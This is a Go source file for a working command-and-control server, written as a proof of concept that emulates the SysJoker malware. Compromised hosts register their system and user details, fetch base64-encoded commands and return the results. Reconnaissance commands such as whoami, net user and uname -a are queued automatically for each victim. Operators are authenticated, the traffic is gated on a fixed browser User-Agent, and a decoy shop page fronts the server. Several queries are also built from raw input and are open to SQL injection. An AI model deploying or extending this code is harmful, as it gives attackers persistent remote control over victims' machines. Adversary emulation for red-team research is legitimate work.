package main

/*
Purpose: Build a simple C2 server as a PoC

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/c2server/"

Install Dependencies
go get github.com/mattn/go-sqlite3

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

Build a config.json file
{
        "listeningPort": "8000",
        "serverCert": "keys/server.crt",
        "serverKey": "keys/server.key",
        "dbLocation": "db/info.db",
		"operatorRegistrationKey": ""
}

// To cross compile for linux
// The sqlite3 driver relies on CGO being enabled you need to remove CGO_ENABLED=0
// GOOS=linux GOARCH=amd64 go build -o c2server.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o c2server.exe -ldflags "-w -s" main.go

References:
Emulating this adversary... https://research.checkpoint.com/2023/israel-hamas-war-spotlight-shaking-the-rust-off-sysjoker/

*/

import (
	"bytes"
	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
	"crypto/rand"
	"database/sql"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	// Import SQLite3 driver
	_ "github.com/mattn/go-sqlite3"
)

type Configuration struct {
	ListeningPort           string `json:"listeningPort"`
	ServerCert              string `json:"serverCert"`
	ServerKey               string `json:"serverKey"`
	DBLocation              string `json:"dbLocation"`
	OperatorRegistrationKey string `json:"operatorRegistrationKey"`
}

type registerInfo struct {
	OSInfo             string `json:"osInfo"`
	OSWorkingDirectory string `json:"osWorkingDirectory"`
	OSHostname         string `json:"osHostname"`
	Username           string `json:"username"`
	UserHomeDirectory  string `json:"userHomeDirectory"`
	UserGID            string `json:"userGID"`
	UserUID            string `json:"userUID"`
	IPAddresses        string `json:"ipAddresses"`
	MACAddresses       string `json:"macAddresses"`
	LastConnected      string `json:"lastConnected"`
}

type botInformation struct {
	SelectedUUID string          `json:"botUUID"`
	HostnameBot  string          `json:"hostnameBot"`
	UsernameBot  string          `json:"usernameBot"`
	IPAddresses  string          `json:"ipAddresses"`
	OperatorName string          `json:"operatorName"`
	SessionKey   string          `json:"sessionKey"`
	LastCommands []commandStruct `json:"lastCommands"`
}

type commandStruct struct {
	CommandID         string `json:"commandID"`
	Command           string `json:"command"`
	Results           string `json:"results"`
	TSResultsReturned string `json:"tsResultsReturned"`
}

type operatorStruct struct {
	OperatorRegistrationKey string `json:"operatorRegistrationKey"`
	OperatorName            string `json:"operatorName"`
	OperatorKey             string `json:"operatorKey"`
}

type operatorInformation struct {
	OperatorSessionKey string   `json:"operatorSessionKey"`
	ClientUUIDs        []string `json:"clientUUIDs"`
	ClientHostnames    []string `json:"clientHostnames"`
	ClientIPs          []string `json:"clientIPs"`
	Usernames          []string `json:"Usernames"`
	LastConnected      []string `json:"lastConnected"`
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" // Define the characters to be used
	var result string
	for i := 0; i < length; i++ {
		randomIndex, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		result += string(charset[randomIndex.Int64()])
	}
	return result
}

func loggingOutput(r *http.Request) {
	var colorReset = "\033[0m"
	var colorGreen = "\033[32m"

	timeNow := time.Now()
	stringTime := timeNow.Format(time.RFC822)
	fmt.Print(colorGreen + "<-- Request -->\n" + colorReset)
	remoteAddrItems := strings.Split(r.RemoteAddr, ":") // The displays the <sourceIP>:<sourcePort>
	fmt.Print("Date: " + stringTime + " SIP: " + remoteAddrItems[0] + " Method: " + r.Method + " URL: " + r.URL.String() + "\n")
	fmt.Print(colorGreen + "<-- Headers -->\n" + colorReset)
	for key, values := range r.Header {
		for _, value := range values {
			fmt.Println(key + ": " + value)
			//rw.Header().Set(key, value)
		}
	}
}

func headerHTML() string {
	hHTML := `<!DOCTYPE html>
			  <html lang="en">
  			  <head>
    			<meta charset="UTF-8" />
    			<meta name="viewport" content="width=device-width, initial-scale=1.0" />
    			<meta http-equiv="X-UA-Compatible" content="ie=edge" />
  			  </head>
  			  <body>`
	return hHTML
}

func tailHTML() string {
	tHTML := "</body></html>"
	return tHTML
}

func createIndexHTML(folderDir string) {
	currentDir, _ := os.Getwd()
	newDir := currentDir + folderDir
	//cf.CheckError("Unable to get the working directory", err, true)
	if _, err := os.Stat(newDir); errors.Is(err, os.ErrNotExist) {
		// Output to File - Overwrites if file exists...
		f, err := os.Create(newDir)
		cf.CheckError("Unable create file index.html "+currentDir, err, true)
		defer f.Close()
		f.Write([]byte(headerHTML()))
		f.Write([]byte("Swayzee Merchantile"))
		f.Write([]byte(tailHTML()))
		f.Close()
	}
}

func generateUUID() string {
	uuid := make([]byte, 16)

	// Generate 16 random bytes
	_, err := rand.Read(uuid)
	if err != nil {
		panic(err)
	}

	// Set version (4) and variant bits
	uuid[6] = (uuid[6] & 0x0f) | 0x40 // Version 4
	uuid[8] = (uuid[8] & 0x3f) | 0x80 // Variant is 10

	// Format the UUID according to RFC 4122
	return fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:])
}

func createDatabase(path string) {
	// Create the database file
	/*
		if _, err := os.Stat(path); err != nil {
			file, err := os.Create(path)
			cf.CheckError("Unable to create the file for the database", err, true)
			file.Close()
		}
	*/
	fmt.Println(path)
	//db, err := sql.Open("sqlite3", "/home/thepcn3rd/go/workspaces/c2server/db/info.db")
	db, err := sql.Open("sqlite3", path)
	//db, err := sql.Open("sqlite3", ":memory:")
	cf.CheckError("Unable to create the database", err, true)
	defer db.Close()

	// Create the database
	//createDatabaseSQL := "CREATE DATABASE info"
	//query, err := db.Prepare(createDatabaseSQL)
	//cf.CheckError("Unable to create the database info", err, true)
	//query.Exec()

	// Create the registerInfo Table for clients that connect
	//testTableSQL := "CREATE TABLE clients (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, stuff TEXT)"

	createRegisterTableSQL := `
		CREATE TABLE IF NOT EXISTS clients (
			id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
			uuid TEXT NOT NULL,
			osInfo TEXT NOT NULL,
			osWorkingDirectory TEXT NOT NULL,
			osHostname TEXT NOT NULL,
			Username TEXT NOT NULL,
			UserHomeDirectory TEXT NOT NULL,
			UserGID TEXT NOT NULL,
			UserUID TEXT NOT NULL,
			IPAddresses TEXT NOT NULL,
			MACAddresses TEXT NOT NULL,
			LastConnected TEXT NOT NULL
		);
		`

	_, err = db.Exec(createRegisterTableSQL)
	cf.CheckError("Unable to create table clients in the database - 001", err, true)

	// Create the command table for the clients to gather the commands and store the results of those commands
	createCommandTableSQL := `
	CREATE TABLE IF NOT EXISTS commands (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		uuid TEXT NOT NULL,
		command TEXT NOT NULL,
		tsCreated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
		results TEXT,
		tsResultsReturned TIMESTAMP
	)
	`
	_, err = db.Exec(createCommandTableSQL)
	cf.CheckError("Unable to create table commands in the database", err, true)

	// Create the operator table for the red team members to create the commands to execute on the clients
	// Session Key is good for 8 hours
	createOperatorTableSQL := `
	CREATE TABLE IF NOT EXISTS operators (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		operatorName TEXT NOT NULL,
		operatorKey TEXT NOT NULL,
		tsCreated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
		operatorSessionKey TEXT,
		sessionKeyExpiration TIMESTAMP
	)
	`
	_, err = db.Exec(createOperatorTableSQL)
	cf.CheckError("Unable to create table operators in the database", err, true)

	db.Close()
	fmt.Printf("Created the database...\n\n")
}

func createClientDBQuery(r registerInfo, u string, path string) {
	currentTime := time.Now()
	timestamp := currentTime.Format("2006-01-02 15:04:05")
	// Modify the below to detect the current directory
	db, err := sql.Open("sqlite3", path)
	cf.CheckError("Unable to create the database", err, true)
	defer db.Close()

	query := "INSERT INTO clients (uuid, osInfo, osWorkingDirectory, osHostname, Username, UserHomeDirectory, UserGID, UserUID, IPAddresses, MACAddresses, LastConnected) "
	query += "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
	stmt, err := db.Prepare(query)
	cf.CheckError("Unable to prepare the insert query", err, true)
	defer stmt.Close()

	_, err = stmt.Exec(u, r.OSInfo, r.OSWorkingDirectory, r.OSHostname, r.Username, r.UserHomeDirectory, r.UserGID, r.UserUID, r.IPAddresses, r.MACAddresses, timestamp)
	cf.CheckError("Unable to execute the prepared query", err, true)
	stmt.Close()

	// Detect the OS and then add default commands to add when a client joins
	if r.OSInfo == "linux" {
		// ls			bHM=
		// id			aWQ=
		// uname -a 	dW5hbWUgLWE=
		linuxCommandsSlice := []string{"bHM=", "aWQ=", "dW5hbWUgLWE="}
		for _, command := range linuxCommandsSlice {
			queryCommand := "INSERT INTO commands (uuid, command) "
			queryCommand += "VALUES (?, ?)"
			stmt, err = db.Prepare(queryCommand)
			cf.CheckError("Unable to prepare the insert query for the initial command", err, true)
			defer stmt.Close()

			_, err = stmt.Exec(u, command)
			cf.CheckError("Unable to add the command to execute ls", err, true)

			stmt.Close()
		}
	} else {
		//  dir c:\users    ZGlyIGM6XHVzZXJz
		//  net user		bmV0IHVzZXI=
		//	whoami			d2hvYW1p
		windowsCommandsSlice := []string{"ZGlyIGM6XHVzZXJz", "bmV0IHVzZXI=", "d2hvYW1p"}
		for _, command := range windowsCommandsSlice {
			queryCommand := "INSERT INTO commands (uuid, command) "
			queryCommand += "VALUES (?, ?)"
			stmt, err = db.Prepare(queryCommand)
			cf.CheckError("Unable to prepare the insert query for the initial command", err, true)
			defer stmt.Close()

			_, err = stmt.Exec(u, command)
			cf.CheckError("Unable to add the command to execute ls", err, true)

			stmt.Close()
		}
	}

	db.Close()
}

func clientExistsDBQuery(r registerInfo, path string) (bool, string) {
	// Modify the below to detect the current directory
	db, err := sql.Open("sqlite3", path)
	cf.CheckError("Unable to open the database", err, true)
	defer db.Close()

	query := "SELECT uuid FROM clients WHERE "
	query += "osInfo='" + r.OSInfo + "' AND "
	query += "osHostname='" + r.OSHostname + "' AND "
	query += "Username='" + r.Username + "' AND "
	query += "UserHomeDirectory='" + r.UserHomeDirectory + "' AND "
	query += "UserUID='" + r.UserUID + "'"
	fmt.Println(query)
	rows, err := db.Query(query)
	cf.CheckError("Unable to query the clients table in the database", err, false)
	defer rows.Close()
	rowCount := 0
	uuidReturned := "doesnotexist"
	// Note if 2 records exist in the database it will return the last one
	for rows.Next() {
		rowCount++
		err := rows.Scan(&uuidReturned)
		cf.CheckError("Unable to read the information returned in the query, 004", err, false)
		if err != nil {
			break
		}
	}

	if uuidReturned != "doesnotexist" {
		// Update the clients table with the last connected timestamp
		// LastConnected TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		timeNow := time.Now()
		timeString := timeNow.Format("2006-01-02 15:04:05")
		updateClientsQuery := "UPDATE clients SET LastConnected = ? "
		updateClientsQuery += "WHERE uuid = ?"
		updateClientStmt, err := db.Prepare(updateClientsQuery)
		cf.CheckError("Unable to update the last connected timestamp", err, true)
		defer updateClientStmt.Close()

		_, err = updateClientStmt.Exec(timeString, uuidReturned)
		cf.CheckError("Unable to Execute the Prepared Query for Last Connected Timestamp", err, true)
		updateClientStmt.Close()
	}

	db.Close()

	if rowCount == 0 {
		return false, uuidReturned
	} else {
		return true, uuidReturned
	}
}

func registerConnection(w http.ResponseWriter, r *http.Request, dbPath string) {
	// The malware collects information about the infected system, including the Windows version, username, MAC address, and various other data. This information is then sent to the /api/attach API endpoint on the C2 server, and in response it receives a unique token that serves as an identifier when the malware communicates with the C2
	// Test the POST connection...
	// curl -X POST -d "Test" https://localhost:8000/api/attach -k
	loggingOutput(r)
	if r.Method == "POST" {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the POST to register a connection", err, false)
		fmt.Printf("Received Data: %s\n\n", string(reqBodyBytes))

		// Create SQL Lite Database if it does not exist
		databaseExists := cf.FileExists(dbPath)
		if databaseExists == false {
			createDatabase(dbPath)
		}

		// Insert the data received into the database if it does not exist
		var regInfo registerInfo
		var registrationGUID string
		err = json.Unmarshal(reqBodyBytes, &regInfo)
		cf.CheckError("Unable to convert the JSON to the registrationInfo struct", err, false)
		exists, uuid := clientExistsDBQuery(regInfo, dbPath)
		if exists == false {
			// Create the client record
			// Create a unique GUID (if one does not exist...)
			registrationGUID = generateUUID()
			createClientDBQuery(regInfo, registrationGUID, dbPath)
		} else {
			registrationGUID = uuid
		}

		// Send a response to acknowledge the request to /api/attach
		respBodyBytes := bytes.NewReader([]byte(registrationGUID))
		io.Copy(w, respBodyBytes)
	}
}

func requestCommand(w http.ResponseWriter, r *http.Request, path string) {
	// curl -X POST -d "test" https://localhost:8000/api/req -k
	loggingOutput(r)
	if r.Method == "POST" {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the http request from the client", err, false)
		fmt.Printf("Received Data: %s\n\n", string(reqBodyBytes))
		// Value can be injected into, input validation should be build
		receivedUUID := string(reqBodyBytes)
		// Search the database for a command to execute with no results...
		db, err := sql.Open("sqlite3", path)
		cf.CheckError("Unable to open the database", err, true)
		defer db.Close()
		query := "SELECT id, command FROM commands WHERE "
		query += "uuid='" + receivedUUID + "' AND "
		query += "(results is null OR results='') "
		query += "ORDER BY id "
		query += "LIMIT 1"
		fmt.Println(query)
		rows, err := db.Query(query)
		cf.CheckError("Unable to query the clients table in the database", err, false)
		defer rows.Close()
		rowCount := 0
		var cmdStruct commandStruct
		// Note if 2 records exist in the database it will return the last one
		for rows.Next() {
			rowCount++
			err := rows.Scan(&cmdStruct.CommandID, &cmdStruct.Command)
			cf.CheckError("Unable to read the information returned in the query", err, true)
		}
		if rowCount > 0 {
			fmt.Printf("Command ID: %s Command: %s UUID: %s\n", cmdStruct.CommandID, cmdStruct.Command, receivedUUID)
		} else {
			fmt.Printf("No commands to execute at this time for %s\n", receivedUUID)
		}

		// The command is encoded in the database
		//encodedCommand := base64.StdEncoding.EncodeToString([]byte(cmdStruct.Command))
		//cmdStruct.Command = encodedCommand

		jsonData, err := json.Marshal(cmdStruct)
		cf.CheckError("Unable to create the json data from cmdStruct", err, true)

		// Send a response to acknowledge the request to /api/attach
		respBodyBytes := bytes.NewReader(jsonData)
		io.Copy(w, respBodyBytes)
	}
}

func createOperator(w http.ResponseWriter, r *http.Request, path string, registrationKey string) {
	loggingOutput(r)
	userAgent := r.Header.Get("User-Agent")
	if r.Method == "POST" && strings.Contains(userAgent, "Chrome/115.0.5790.172") {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the http request from the client", err, false)
		fmt.Printf("Received Data: %s\n\n", string(reqBodyBytes))
		// Value can be injected into, input validation should be build
		/*
			type operatorStruct struct {
				OperatorRegistrationKey string `json:"operatorRegistrationKey"`
				OperatorName            string `json:"operatorName"`
				OperatorKey             string `json:"operatorKey"`
			}
		*/
		var opStruct operatorStruct
		err = json.Unmarshal(reqBodyBytes, &opStruct)
		cf.CheckError("Unable to convert json to command structure", err, true)

		if cf.CalcSHA256Hash(opStruct.OperatorRegistrationKey) == cf.CalcSHA256Hash(registrationKey) {
			db, err := sql.Open("sqlite3", path)
			cf.CheckError("Unable to open the database", err, true)
			defer db.Close()

			query := "INSERT INTO operators (operatorName, operatorKey) "
			query += "VALUES (?, ?)"
			stmt, err := db.Prepare(query)
			cf.CheckError("Unable to prepare the insert query", err, true)
			defer stmt.Close()

			_, err = stmt.Exec(opStruct.OperatorName, opStruct.OperatorKey)
			cf.CheckError("Unable to execute the prepared query", err, true)
			stmt.Close()
			db.Close()
			// Send a response to acknowledge the request to /api/attach
			respBodyBytes := bytes.NewReader([]byte("Operator Created"))
			io.Copy(w, respBodyBytes)
		} else {
			// Send a response to acknowledge the request to /api/attach
			respBodyBytes := bytes.NewReader([]byte("Failed to Create the Operator"))
			io.Copy(w, respBodyBytes)
		}
	}
}

func authOperator(w http.ResponseWriter, r *http.Request, dbPath string) {
	loggingOutput(r)
	// Receive a GET to return the UUIDs of the bots with additional information
	userAgent := r.Header.Get("User-Agent")
	if r.Method == "POST" && strings.Contains(userAgent, "Chrome/115.0.5790.172") {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the http request from the operator", err, false)
		fmt.Printf("Auth Operator Received Data: %s\n\n", string(reqBodyBytes))

		var opStruct operatorStruct
		err = json.Unmarshal(reqBodyBytes, &opStruct)
		cf.CheckError("Unable to convert json to command structure", err, true)

		if opStruct.OperatorName != "" {
			//Search the database for the name of the operator and return the key
			db, err := sql.Open("sqlite3", dbPath)
			cf.CheckError("Unable to open the database", err, true)
			defer db.Close()
			query := "SELECT operatorKey FROM operators WHERE "
			query += "operatorName='" + opStruct.OperatorName + "'"
			rows, err := db.Query(query)

			cf.CheckError("Unable to query the clients table in the database", err, false)
			defer rows.Close()
			rowCount := 0
			operatorKey := "doesnotexist"
			// Note if 2 records exist in the database it will return the last one
			for rows.Next() {
				rowCount++
				err := rows.Scan(&operatorKey)
				cf.CheckError("Unable to read the information returned in the query, authOperator", err, true)
			}
			rows.Close()

			// If the operator key equals the operator key
			if cf.CalcSHA256Hash(operatorKey) == cf.CalcSHA256Hash(opStruct.OperatorKey) {
				timeNow := time.Now()
				randomString := generateRandomString(128)
				// Generate a unique operator session key for each auth and update in the database
				operatorSessionKey := cf.CalcSHA256Hash(timeNow.String() + opStruct.OperatorKey + randomString)
				sessionKeyExpiration := timeNow.Add(8 * time.Hour)

				updateQuery := "UPDATE operators SET operatorSessionKey = ?, "
				updateQuery += "sessionKeyExpiration = ? "
				updateQuery += "WHERE operatorName = ? AND operatorKey = ?"
				updateStmt, err := db.Prepare(updateQuery)
				cf.CheckError("Unable to prepare the update query for the operator", err, true)
				defer updateStmt.Close()

				_, err = updateStmt.Exec(operatorSessionKey, sessionKeyExpiration, opStruct.OperatorName, opStruct.OperatorKey)
				cf.CheckError("Unable to execute the prepared statement to update the operator results", err, true)
				updateStmt.Close()

				// Select the clients available and send to the operator
				var opInfo operatorInformation
				opInfo.OperatorSessionKey = operatorSessionKey
				// Query database for available client IDs
				queryClients := "SELECT uuid, osHostname, IPAddresses, Username, LastConnected FROM clients"
				fmt.Println("Query Clients: " + queryClients)
				rows, err = db.Query(queryClients)
				cf.CheckError("Unable to query the clients table in the database", err, true)
				defer rows.Close()
				rowCount := 0
				uuidReturned := "None"
				osHostname := "None"
				ipAddress := "None"
				lastConnected := "None"
				Username := "None"
				for rows.Next() {
					rowCount++
					err := rows.Scan(&uuidReturned, &osHostname, &ipAddress, &Username, &lastConnected)
					fmt.Println(lastConnected)
					cf.CheckError("Unable to read the information returned in the query, 003", err, true)
					if uuidReturned != "None" {
						opInfo.ClientUUIDs = append(opInfo.ClientUUIDs, uuidReturned)
						opInfo.ClientHostnames = append(opInfo.ClientHostnames, osHostname)
						opInfo.ClientIPs = append(opInfo.ClientIPs, ipAddress)
						opInfo.LastConnected = append(opInfo.LastConnected, lastConnected)
						opInfo.Usernames = append(opInfo.Usernames, Username)
					}
				}
				jsonData, err := json.Marshal(opInfo)
				cf.CheckError("Unable to Marshal the opInfo", err, true)
				respBodyBytes := bytes.NewReader(jsonData)
				io.Copy(w, respBodyBytes)

				rows.Close()
				db.Close()
			}

		}

	}
}

func saveResults(w http.ResponseWriter, r *http.Request, path string) {
	loggingOutput(r)
	if r.Method == "POST" {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the http request from the client", err, false)
		fmt.Printf("Received Data: %s\n\n", string(reqBodyBytes))
		// Value can be injected into, input validation should be build

		var cmdStruct commandStruct
		err = json.Unmarshal(reqBodyBytes, &cmdStruct)
		cf.CheckError("Unable to convert json to command structure", err, true)

		if cmdStruct.CommandID != "" {
			// Search the database for a command to execute with no results...
			db, err := sql.Open("sqlite3", path)
			cf.CheckError("Unable to open the database", err, true)
			defer db.Close()

			query := "UPDATE commands SET results = ?, "
			query += "tsResultsReturned = ? "
			query += "WHERE id = ? AND command = ?"
			updateStmt, err := db.Prepare(query)
			cf.CheckError("Unable to prepare the update query for the results", err, true)
			defer updateStmt.Close()

			currentTime := time.Now()
			timestamp := currentTime.Format("2006-01-02 15:04:05")

			// Command is encoded coming to the server, no need to decode
			encodedResults := cmdStruct.Results
			//decodedCommand, err := base64.StdEncoding.DecodeString(cmdStruct.Command)
			//cf.CheckError("Unable to decode the cmdstruct command, 004", err, true)
			intCommandID, err := strconv.Atoi(cmdStruct.CommandID)
			cf.CheckError("Unable to convert the command ID string to command ID int", err, true)

			_, err = updateStmt.Exec(encodedResults, timestamp, intCommandID, cmdStruct.Command)
			cf.CheckError("Unable to execute the prepared statement to update the results", err, true)
			respBodyBytes := bytes.NewReader([]byte("Recorded the Results Provided"))
			io.Copy(w, respBodyBytes)

			updateStmt.Close()
			db.Close()
		}
	}
}

func gatherInfo(w http.ResponseWriter, r *http.Request, dbPath string) {
	loggingOutput(r)
	// Receive a GET to return the UUIDs of the bots with additional information
	userAgent := r.Header.Get("User-Agent")
	if r.Method == "POST" && strings.Contains(userAgent, "Chrome/115.0.5790.172") {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the http request from the client", err, false)
		fmt.Printf("Received Data: %s\n\n", string(reqBodyBytes))

		var botInfo botInformation
		//botInfo.selectedUUID = string(reqBodyBytes)
		err = json.Unmarshal(reqBodyBytes, &botInfo)
		cf.CheckError("Unable to convert json to botInfo structure", err, true)
		// Verify the session key is correct
		db, err := sql.Open("sqlite3", dbPath)
		cf.CheckError("Unable to open database in gatherInfo", err, true)
		defer db.Close()
		// SQL Injection can occur on the operatorName -- Warning...
		query := "SELECT operatorSessionKey FROM operators WHERE "
		query += "operatorName = '" + botInfo.OperatorName + "'"
		rows, err := db.Query(query)
		cf.CheckError("Unable to query the operators table in gatherInfo", err, true)
		operatorSessionKey := "doesnotexist"
		authSessionStatus := "Not Authenticated"
		for rows.Next() {
			err := rows.Scan(&operatorSessionKey)
			cf.CheckError("Unable to read the rows queried", err, true)
		}
		rows.Close()

		sentSessionKeySHA256 := cf.CalcSHA256Hash(botInfo.SessionKey)
		operatorSessionKeySHA256 := cf.CalcSHA256Hash(operatorSessionKey)
		if operatorSessionKeySHA256 == sentSessionKeySHA256 {
			authSessionStatus = "Authenticated"
		}
		// Pull the last 5 commands if they exist then send them back...
		fmt.Println(authSessionStatus)

		if authSessionStatus == "Authenticated" {
			//type commandStruct struct {
			//	CommandID         string `json:"commandID"`
			//	Command           string `json:"command"`
			//	Results           string `json:"results"`
			//	TSResultsReturned string `json:"tsResultsReturned"`
			//}

			// Only returns the last 5 commands with the current query
			//queryCommands := "SELECT id, command, results, tsResultsReturned "
			queryCommands := "SELECT id, command, results, tsResultsReturned "
			queryCommands += "FROM commands "
			queryCommands += "WHERE uuid='" + botInfo.SelectedUUID + "' "
			queryCommands += "ORDER by id DESC "
			queryCommands += "LIMIT 5"
			fmt.Println(queryCommands)
			rows, err := db.Query(queryCommands)
			cf.CheckError("Unable to query the commands table", err, true)
			defer rows.Close()
			var cmdStruct commandStruct
			var intCommandID int
			var results sql.NullString
			var tsResults sql.NullString
			rowCount := 0
			for rows.Next() {
				//err := rows.Scan(&intCommandID, &cmdStruct.Command, &cmdStruct.Results, &cmdStruct.TSResultsReturned)
				err := rows.Scan(&intCommandID, &cmdStruct.Command, &results, &tsResults)
				fmt.Println(err)
				if err == nil {
					cmdStruct.CommandID = strconv.Itoa(intCommandID)
					cmdStruct.Results = results.String
					cmdStruct.TSResultsReturned = tsResults.String
					cf.CheckError("Unable to build the cmdStruct in gatherInfo", err, true)
					fmt.Printf("%s", cmdStruct)
					rowCount++
					botInfo.LastCommands = append(botInfo.LastCommands, cmdStruct)
				}
			}
			fmt.Println(botInfo.LastCommands)

			// Query for the hostname and the IP Addresses and return them in botInfo
			queryClient := "SELECT osHostname, Username, IPAddresses FROM clients WHERE uuid='" + botInfo.SelectedUUID + "'"
			fmt.Println(queryClient)
			rows, err = db.Query(queryClient)
			cf.CheckError("Unable to query the client table", err, true)
			defer rows.Close()
			rowCount = 0
			for rows.Next() {
				err := rows.Scan(&botInfo.HostnameBot, &botInfo.UsernameBot, &botInfo.IPAddresses)
				cf.CheckError("Uable to populate the hostname, username and IP Address of the bot", err, true)
				rowCount++
			}

			jsonData, err := json.Marshal(botInfo)
			respBodyBytes := bytes.NewReader(jsonData)
			io.Copy(w, respBodyBytes)
		}

		db.Close()
	}

}

func addCommand(w http.ResponseWriter, r *http.Request, dbPath string) {
	loggingOutput(r)
	// Receive a POST
	userAgent := r.Header.Get("User-Agent")
	if r.Method == "POST" && strings.Contains(userAgent, "Chrome/115.0.5790.172") {
		reqBodyBytes, err := io.ReadAll(r.Body)
		cf.CheckError("Unable to read the http request from the client", err, false)
		fmt.Printf("Received Data: %s\n\n", string(reqBodyBytes))

		var botInfo botInformation
		//botInfo.selectedUUID = string(reqBodyBytes)
		err = json.Unmarshal(reqBodyBytes, &botInfo)
		cf.CheckError("Unable to convert json to botInfo structure", err, true)
		// Verify the session key is correct
		db, err := sql.Open("sqlite3", dbPath)
		cf.CheckError("Unable to open database in gatherInfo", err, true)
		defer db.Close()
		// SQL Injection can occur on the operatorName -- Warning...
		query := "SELECT operatorSessionKey FROM operators WHERE "
		query += "operatorName = '" + botInfo.OperatorName + "'"
		rows, err := db.Query(query)
		cf.CheckError("Unable to query the operators table in gatherInfo", err, true)
		operatorSessionKey := "doesnotexist"
		authSessionStatus := "Not Authenticated"
		for rows.Next() {
			err := rows.Scan(&operatorSessionKey)
			cf.CheckError("Unable to read the rows queried", err, true)
		}
		rows.Close()

		sentSessionKeySHA256 := cf.CalcSHA256Hash(botInfo.SessionKey)
		operatorSessionKeySHA256 := cf.CalcSHA256Hash(operatorSessionKey)
		if operatorSessionKeySHA256 == sentSessionKeySHA256 {
			authSessionStatus = "Authenticated"
		}

		fmt.Println(authSessionStatus)

		// Add Command to the commands table in the database
		if authSessionStatus == "Authenticated" {
			queryCommand := "INSERT INTO commands (uuid, command) "
			queryCommand += "VALUES (?, ?)"
			stmt, err := db.Prepare(queryCommand)
			cf.CheckError("Unable to prepare the insert query for the initial command", err, true)
			defer stmt.Close()

			_, err = stmt.Exec(botInfo.SelectedUUID, botInfo.LastCommands[0].Command)
			cf.CheckError("Unable to add the command to execute ls", err, true)

			stmt.Close()
		}

		db.Close()
		respBodyBytes := bytes.NewReader([]byte(authSessionStatus))
		io.Copy(w, respBodyBytes)
	}

}

func main() {
	ConfigPtr := flag.String("config", "config.json", "Configuration file to load for the proxy")
	flag.Parse()

	// Create the keys directory if it does not exist
	cf.CreateDirectory("/db")
	cf.CreateDirectory("/keys")
	cf.CreateDirectory("/static")
	// Generate a default index.html page
	createIndexHTML("/static/index.html")
	cf.CreateDirectory("/static/downloads")
	createIndexHTML("/static/downloads/index.html")

	fmt.Println("Loading the following config file: " + *ConfigPtr + "\n")
	configFile, err := os.Open(*ConfigPtr)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config Configuration
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}

	// Does the certConfig.json  file exist in the keys folder
	configFileExists := cf.FileExists("keys/certConfig.json")
	//fmt.Println(configFileExists)
	if configFileExists == false {
		cf.CreateCertConfigFile()
		fmt.Println("Created keys/certConfig.json, modify the values to create the self-signed cert utilized")
		os.Exit(0)
	}

	// Does the server.crt and server.key files exist in the keys folder
	crtFileExists := cf.FileExists(config.ServerCert)
	keyFileExists := cf.FileExists(config.ServerKey)
	if crtFileExists == false || keyFileExists == false {
		cf.CreateCerts()
		crtFileExists := cf.FileExists(config.ServerCert)
		keyFileExists := cf.FileExists(config.ServerKey)
		if crtFileExists == false || keyFileExists == false {
			fmt.Println("Failed to create server.crt and server.key files")
			os.Exit(0)
		}
	}

	// Start the handling of requests to the server
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		//http.Handle("/", http.FileServer(http.Dir("./static")))
		loggingOutput(r)
		http.FileServer(http.Dir("./static")).ServeHTTP(w, r)
	})

	// Register a Client Connection
	http.HandleFunc("/api/attach", func(w http.ResponseWriter, r *http.Request) {
		registerConnection(w, r, config.DBLocation)
	})

	// Request a Command to be Executed
	http.HandleFunc("/api/req", func(w http.ResponseWriter, r *http.Request) {
		requestCommand(w, r, config.DBLocation)
	})

	// Save the results of a command executed
	http.HandleFunc("/api/req/res", func(w http.ResponseWriter, r *http.Request) {
		saveResults(w, r, config.DBLocation)
	})

	// Create Operator
	http.HandleFunc("/api/co", func(w http.ResponseWriter, r *http.Request) {
		createOperator(w, r, config.DBLocation, config.OperatorRegistrationKey)
	})

	// Operator - Authenticate Operator
	// If authenticated Return Bot IDs...
	http.HandleFunc("/api/ao", func(w http.ResponseWriter, r *http.Request) {
		authOperator(w, r, config.DBLocation)
	})

	// Operator - Gather Info about Bot
	http.HandleFunc("/api/gi", func(w http.ResponseWriter, r *http.Request) {
		gatherInfo(w, r, config.DBLocation)
	})

	// Operator - Add a command for a client to execute
	http.HandleFunc("/api/ac", func(w http.ResponseWriter, r *http.Request) {
		addCommand(w, r, config.DBLocation)
	})

	listeningPort := ":" + config.ListeningPort
	fmt.Printf("Started the webserver with TLS on port: %s\n\n", listeningPort)
	log.Fatal(http.ListenAndServeTLS(listeningPort, config.ServerCert, config.ServerKey, nil))

}
